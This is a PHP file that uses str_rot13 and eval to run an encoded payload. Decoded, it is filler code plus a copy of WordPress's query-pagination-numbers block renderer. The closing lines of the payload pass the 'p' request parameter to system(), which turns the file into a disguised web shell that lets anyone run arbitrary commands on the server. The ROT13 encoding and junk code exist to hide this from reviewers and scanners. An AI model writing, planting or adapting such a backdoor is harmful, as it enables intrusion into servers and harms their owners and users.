<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-cntvangvba-ahzoref` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/dhrel-cntvangvba-ahzoref` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur cntvangvba ahzoref sbe gur Dhrel.
 */
shapgvba eraqre_oybpx_pber_dhrel_cntvangvba_ahzoref( $nggevohgrf, $pbagrag, $oybpx ) {
	$cntr_xrl            = vffrg( $oybpx->pbagrkg['dhrelVq'] ) ? 'dhrel-' . $oybpx->pbagrkg['dhrelVq'] . '-cntr' : 'dhrel-cntr';
	$raunaprq_cntvangvba = vffrg( $oybpx->pbagrkg['raunaprqCntvangvba'] ) && $oybpx->pbagrkg['raunaprqCntvangvba'];
	$cntr                = rzcgl( $_TRG[ $cntr_xrl ] ) ? 1 : (vag) $_TRG[ $cntr_xrl ];
	$znk_cntr            = vffrg( $oybpx->pbagrkg['dhrel']['cntrf'] ) ? (vag) $oybpx->pbagrkg['dhrel']['cntrf'] : 0;

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	$pbagrag            = '';
	tybony $jc_dhrel;
	$zvq_fvmr = vffrg( $oybpx->nggevohgrf['zvqFvmr'] ) ? (vag) $oybpx->nggevohgrf['zvqFvmr'] : ahyy;
	vs ( vffrg( $oybpx->pbagrkg['dhrel']['vaurevg'] ) && $oybpx->pbagrkg['dhrel']['vaurevg'] ) {
		// Gnxr vagb nppbhag vs jr unir frg n ovttre `znk cntr`
		// guna jung gur dhrel unf.
		$gbgny         = ! $znk_cntr || $znk_cntr > $jc_dhrel->znk_ahz_cntrf ? $jc_dhrel->znk_ahz_cntrf : $znk_cntr;
		$cntvangr_netf = neenl(
			'ceri_arkg' => snyfr,
			'gbgny'     => $gbgny,
		);
		vs ( ahyy !== $zvq_fvmr ) {
			$cntvangr_netf['zvq_fvmr'] = $zvq_fvmr;
		}
		$pbagrag = cntvangr_yvaxf( $cntvangr_netf );
	} ryfr {
		$oybpx_dhrel = arj JC_Dhrel( ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $cntr ) );
		// `cntvangr_yvaxf` jbexf jvgu gur tybony $jc_dhrel, fb jr unir gb
		// grzcbenevyl fjvgpu vg jvgu bhe phfgbz dhrel.
		$ceri_jc_dhrel = $jc_dhrel;
		$jc_dhrel      = $oybpx_dhrel;
		$gbgny         = ! $znk_cntr || $znk_cntr > $jc_dhrel->znk_ahz_cntrf ? $jc_dhrel->znk_ahz_cntrf : $znk_cntr;
		$cntvangr_netf = neenl(
			'onfr'      => '%_%',
			'sbezng'    => \"?$cntr_xrl=%#%\",
			'pheerag'   => znk( 1, $cntr ),
			'gbgny'     => $gbgny,
			'ceri_arkg' => snyfr,
		);
		vs ( ahyy !== $zvq_fvmr ) {
			$cntvangr_netf['zvq_fvmr'] = $zvq_fvmr;
		}
		vs ( 1 !== $cntr ) {
			/**
			 * `cntvangr_yvaxf` qbrfa'g hfr gur cebivqrq `sbezng` jura gur cntr vf `1`.
			 * Guvf vf terng sbe gur znva dhrel nf vg erzbirf gur rkgen dhrel cnenzf
			 * znxvat gur HEY fubegre, ohg va gur pnfr bs zhygvcyr phfgbz dhrevrf vf
			 * ceboyrzngvp. Vg erfhygf va ergheavat na rzcgl yvax juvpu raqf hc jvgu
			 * n yvax gb gur pheerag cntr.
			 *
			 * N jnl gb nqqerff guvf vf gb nqq n `snxr` dhrel net jvgu ab inyhr gung
			 * vf gur fnzr sbe nyy phfgbz dhrevrf. Guvf jnl gur yvax vf abg rzcgl naq
			 * cerfreirf nyy gur bgure rkvfgrag dhrel netf.
			 *
			 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/cntvangr_yvaxf/
			 *
			 * Gur cebcre svk bs guvf fubhyq or va pber. Genpx Gvpxrg:
			 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53868
			 *
			 * GBQB: Nsgre gjb JC irefvbaf (fgnegvat sebz gur JC irefvba gur pber cngpu ynaqrq),
			 * jr fubhyq erzbir guvf naq pnyy `cntvangr_yvaxf` jvgu gur cebcre arj net.
			 */
			$cntvangr_netf['nqq_netf'] = neenl( 'pfg' => '' );
		}
		// Jr fgvyy arrq gb cerfreir `cntrq` dhrel cnenz vs rkvfgf, nf vf hfrq
		// sbe Dhrevrf gung vaurevg sebz tybony pbagrkg.
		$cntrq = rzcgl( $_TRG['cntrq'] ) ? ahyy : (vag) $_TRG['cntrq'];
		vs ( $cntrq ) {
			$cntvangr_netf['nqq_netf'] = neenl( 'cntrq' => $cntrq );
		}
		$pbagrag = cntvangr_yvaxf( $cntvangr_netf );
		jc_erfrg_cbfgqngn(); // Erfgber bevtvany Cbfg Qngn.
		$jc_dhrel = $ceri_jc_dhrel;
	}

	vs ( rzcgl( $pbagrag ) ) {
		erghea '';
	}

	vs ( $raunaprq_cntvangvba ) {
		$c         = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
		$gnt_vaqrk = 0;
		juvyr ( $c->arkg_gnt(
			neenl( 'pynff_anzr' => 'cntr-ahzoref' )
		) ) {
			vs ( ahyy === $c->trg_nggevohgr( 'qngn-jc-xrl' ) ) {
				$c->frg_nggevohgr( 'qngn-jc-xrl', 'vaqrk-' . $gnt_vaqrk++ );
			}
			vs ( 'N' === $c->trg_gnt() ) {
				$c->frg_nggevohgr( 'qngn-jc-ba--pyvpx', 'pber/dhrel::npgvbaf.anivtngr' );
			}
		}
		$pbagrag = $c->trg_hcqngrq_ugzy();
	}

	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pbagrag
	);
}

/**
 * Ertvfgref gur `pber/dhrel-cntvangvba-ahzoref` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_cntvangvba_ahzoref() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-cntvangvba-ahzoref',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_cntvangvba_ahzoref',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_cntvangvba_ahzoref' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>